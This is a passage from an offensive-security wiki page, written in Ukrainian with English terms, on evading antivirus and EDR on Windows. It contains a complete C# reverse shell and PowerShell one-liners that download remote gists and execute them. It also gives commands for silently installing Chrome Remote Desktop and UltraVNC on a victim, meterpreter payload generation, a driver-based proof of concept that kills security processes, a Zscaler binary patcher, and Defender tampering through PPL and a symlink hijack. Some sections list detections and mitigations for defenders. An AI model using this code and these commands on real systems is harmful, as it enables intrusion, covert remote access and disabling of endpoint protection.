Більше інформації можна знайти тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# binaries у пам’ять відоме вже досить давно, і це досі дуже хороший спосіб запускати ваші post-exploitation tools без викриття з боку AV.

Оскільки payload буде завантажено напряму в пам’ять, без запису на диск, нам потрібно буде лише подбати про patching AMSI для всього process.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) уже надають можливість виконувати C# assemblies напряму в пам’яті, але є різні способи це робити:

- **Fork\&Run**

Це передбачає **створення нового sacrificial process**, injection вашого malicious code post-exploitation у цей новий process, виконання malicious code і, після завершення, завершення нового process. У цього є і переваги, і недоліки. Перевага методу fork and run у тому, що execution відбувається **поза** нашим Beacon implant process. Це означає, що якщо щось у нашій post-exploitation action піде не так або буде виявлено, є **набагато вищий шанс**, що наш **implant survive.** Недолік у тому, що є **вищий шанс** бути виявленими **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Йдеться про injection malicious code post-exploitation **у власний process**. Так можна уникнути створення нового process і його сканування AV, але недолік у тому, що якщо під час execution вашого payload щось піде не так, є **набагато вищий шанс** **втратити beacon**, оскільки він може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо хочете дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**, перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати malicious code, використовуючи інші languages, надаючи compromised machine доступ **до interpreter environment, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries і environment на SMB share, ви можете **execute arbitrary code in these languages within memory** скомпрометованої machine.

У repo зазначено: Defender усе ще сканує scripts, але завдяки використанню Go, Java, PHP тощо ми маємо **більше гнучкості для обходу static signatures**. Тестування на випадкових необфускованих reverse shell scripts у цих languages показало успіх.

## TokenStomping

Token stomping — це technique, яка дозволяє attacker **manipulate the access token or a security prouct like an EDR or AV**, зменшуючи його privileges так, щоб process не завершувався, але не мав permissions перевіряти malicious activities.

Щоб запобігти цьому, Windows може **prevent external processes** від отримання handles до tokens security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), просто розгорнути Chrome Remote Desktop на PC жертви, а потім використати його для takeover і підтримання persistence дуже легко:
1. Download з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть на MSI file для Windows, щоб завантажити MSI file.
2. Запустіть installer тихо на victim (потрібен admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть next. Wizard попросить вас authorize; натисніть кнопку Authorize, щоб продовжити.
4. Execute given parameter із деякими adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Зверніть увагу на параметр pin, який дозволяє встановити pin без використання GUI).


## Advanced Evasion

Evasion — дуже складна тема, іноді потрібно враховувати багато різних джерел telemetry в одній system, тож майже неможливо залишатися повністю непоміченим у mature environments.

Кожне environment, проти якого ви працюєте, матиме свої сильні та слабкі сторони.

Дуже раджу вам подивитися цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати foothold у більш Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

це також ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Ви можете використати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **remove parts of the binary** доти, доки не **finds out which part Defender** вважає malicious, і покаже вам це.\
Інший tool, який робить **same thing is** [**avred**](https://github.com/dobin/avred) з відкритим web-сервісом за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі Windows постачалися з **Telnet server**, який можна було встановити (as administrator), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб воно **запускалося** під час старту системи і **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити telnet port** (stealth) і вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте його з: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні bin downloads, не setup)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте server:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть password у _VNC Password_
- Встановіть password у _View-Only Password_

Потім перемістіть binary _**winvnc.exe**_ та **щойно** створений файл _**UltraVNC.ini**_ всередину **victim**

#### **Reverse connection**

**attacker** має **запустити всередині** свого **host** binary `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти reverse **VNC connection**. Потім, всередині **victim**: Запустіть winvnc daemon `winvnc.exe -run` і запустіть `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Щоб зберегти stealth, ви не повинні робити кілька речей

- Не запускайте `winvnc`, якщо він уже працює, інакше ви спровокуєте [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи він запущений, за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій директорії, інакше відкриється [the config window](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для help, інакше ви спровокуєте [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його з: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний захисник дуже швидко завершить процес.**

### Компілюємо наш власний reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# за допомогою компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Using python for build injectors example:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 використав невелику консольну утиліту, відому як **Antivirus Terminator**, щоб вимкнути endpoint protections перед запуском ransomware. Інструмент приносить свій **власний вразливий, але *signed* драйвер** і зловживає ним, щоб виконувати привілейовані kernel-операції, які навіть Protected-Process-Light (PPL) AV services не можуть заблокувати.

Key take-aways
1. **Signed driver**: Файл, який доставляється на диск, це `ServiceMouse.sys`, але бінарник насправді є коректно signed драйвером `AToolsKrnl64.sys` з Antiy Labs “System In-Depth Analysis Toolkit”. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли Driver-Signature-Enforcement (DSE) увімкнено.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий запускає його, щоб `\\.\ServiceMouse` стало доступним із user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD пропускає user-mode protections повністю; code, що виконується в kernel, може відкривати *protected* processes, завершувати їх або змінювати kernel objects незалежно від PPL/PP, ELAM чи інших hardening features.

Detection / Mitigation
•  Увімкніть Microsoft vulnerable-driver block list (`HVCI`, `Smart App Control`), щоб Windows відмовлявся завантажувати `AToolsKrnl64.sys`.
•  Моніторте створення нових *kernel* services і сповіщайте, коли драйвер завантажується з world-writable directory або відсутній у allow-list.
•  Відстежуйте user-mode handles до custom device objects, після яких ідуть підозрілі `DeviceIoControl` calls.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler **Client Connector** застосовує device-posture rules локально і покладається на Windows RPC для передавання результатів іншим компонентам. Два слабкі design choices роблять повний bypass можливим:

1. Posture evaluation відбувається **повністю client-side** (на сервер надсилається boolean).
2. Internal RPC endpoints лише перевіряють, що executable, який підключається, **signed by Zscaler** (через `WinVerifyTrust`).

За допомогою **patching чотирьох signed binaries на диску** можна нейтралізувати обидва механізми:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож кожна перевірка є compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ будь-який процес, навіть unsigned, може прив’язуватися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску stack сервісів:

* **Усі** posture checks показують **green/compliant**.
* Unsigned або modified binaries можуть відкривати named-pipe RPC endpoints (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Compromised host отримує unrestricted доступ до internal network, визначеної політиками Zscaler.

Це case study демонструє, як purely client-side trust decisions і прості signature checks можна обійти кількома byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforce-ить signer/level hierarchy, щоб лише equal-or-higher protected processes могли tamper each other. Offensively, якщо ви можете legitimately launch PPL-enabled binary і контролювати його arguments, ви можете перетворити benign functionality (e.g., logging) на constrained, PPL-backed write primitive against protected directories, які використовуються AV/EDR.

Що робить process таким, що працює як PPL
- Target EXE (і будь-які loaded DLLs) must be signed with a PPL-capable EKU.
- Process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Підписаний системний бінарник `C:\Windows\System32\ClipUp.exe` self-spawns і приймає параметр для запису log file у шлях, заданий caller.
- When launched as a PPL process, file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Примітки та обмеження
- Ви не можете контролювати вміст, який пише ClipUp, окрім розміщення; примітив більше підходить для corruption, ніж для точного injection вмісту.
- Потрібен local admin/SYSTEM, щоб install/start service, і вікно для reboot.
- Timing критичний: target не має бути open; виконання під час boot-time уникає file locks.

Виявлення
- Process creation `ClipUp.exe` з незвичними arguments, особливо якщо parent — нестандартні launchers, під час boot.
- Нові services, налаштовані на auto-start suspicious binaries, які стабільно запускаються before Defender/AV. Перевіряйте creation/modification service перед Defender startup failures.
- File integrity monitoring для Defender binaries/Platform directories; unexpected file creations/modifications процесами з protected-process flags.
- ETW/EDR telemetry: шукайте processes, створені з `CREATE_PROTECTED_PROCESS`, і anomalous PPL level usage не-AV binaries.

Mitigations
- WDAC/Code Integrity: обмежте, які signed binaries можуть запускатися як PPL і під якими parents; блокуйте ClipUp invocation поза legitimate contexts.
- Service hygiene: обмежте creation/modification auto-start services і моніторте start-order manipulation.
- Переконайтеся, що Defender tamper protection і early-launch protections увімкнені; перевіряйте startup errors, що вказують на binary corruption.
- Розгляньте вимкнення генерації 8.3 short-name на volumes, де розміщені security tooling, якщо це сумісно з вашим environment (ретельно протестуйте).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender блокує writes у своїх own folders, but its platform selection trusts directory entries and picks the lexicographically highest version without validating that the target resolves to a protected/trusted path.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть символічне посилання на директорію вищої версії всередині Platform, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Тригер вибору (рекомендовано перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Ви повинні спостерігати новий шлях процесу в `C:\TMP\AV\` та конфігурацію служби/registry, що відображає це розташування.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs, які Defender завантажує зі своєї application directory, щоб виконувати code у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink, щоб під час наступного запуску configured path не резолвився і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зверніть увагу, що ця техніка сама по собі не надає privilege escalation; вона вимагає admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть вивести runtime evasion з C2 implant і перенести його в сам target module, hook-нувши його Import Address Table (IAT) і спрямовуючи вибрані APIs через attacker-controlled, position‑independent code (PIC). Це узагальнює evasion за межі невеликого API surface, який відкривають багато kits (наприклад, CreateProcessA), і поширює ті самі захисти на BOFs та post‑exploitation DLLs.

High-level approach
- Стейджте PIC blob поруч із target module за допомогою reflective loader (prepended або companion). PIC має бути self-contained і position-independent.
- Коли host DLL завантажується, пройдіть його IMAGE_IMPORT_DESCRIPTOR і пропатчте IAT entries для цільових imports (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на thin PIC wrappers.
- Кожен PIC wrapper виконує evasions перед tail-calling реального API address. Типові evasions включають:
- Memory mask/unmask навколо виклику (наприклад, шифрувати beacon regions, RWX→RX, змінювати page names/permissions), а потім відновлювати post-call.
- Call-stack spoofing: побудувати benign stack і перейти в target API так, щоб call-stack analysis розпізнавав очікувані frames.
- Для compatibility export-те interface, щоб Aggressor script (або еквівалент) міг зареєструвати, які APIs hook-ати для Beacon, BOFs і post-ex DLLs.

Why IAT hooking here
- Працює для будь-якого code, що використовує hooked import, без зміни tool code або покладання на Beacon як proxy для конкретних APIs.
- Покриває post-ex DLLs: hook-ing LoadLibrary* дозволяє перехоплювати module loads (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати той самий masking/stack evasion до їхніх API calls.
- Відновлює надійне використання process-spawning post-ex commands проти call-stack–based detections, обгортаючи CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Застосуйте patch після relocations/ASLR і до першого використання import. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Тримайте wrappers маленькими та PIC-safe; резолвіть справжній API через оригінальне IAT value, яке ви захопили до patching, або через LdrGetProcedureAddress.
- Використовуйте RW → RX transitions для PIC і не залишайте writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs будують фейковий call chain (return addresses у benign modules), а потім pivot'ять у реальний API.
- Це обходить detections, які очікують canonical stacks від Beacon/BOFs до sensitive APIs.
- Поєднуйте з stack cutting/stack stitching techniques, щоб потрапити всередину expected frames перед API prologue.

Operational integration
- Додавайте reflective loader до post-ex DLLs, щоб PIC і hooks ініціалізувалися автоматично, коли DLL завантажується.
- Використовуйте Aggressor script, щоб реєструвати target APIs, і Beacon та BOFs прозоро отримували той самий evasion path без змін коду.

Detection/DFIR considerations
- IAT integrity: entries, що резолвляться в non-image (heap/anon) addresses; періодична перевірка import pointers.
- Stack anomalies: return addresses, які не належать loaded images; різкі transitions у non-image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes до IAT, early DllMain activity, що модифікує import thunks, unexpected RX regions, створені під час load.
- Image-load evasion: якщо hook'ите LoadLibrary*, моніторте suspicious loads automation/clr assemblies, correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip`/`Rcx`/`Rdx`/`R8`/`R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
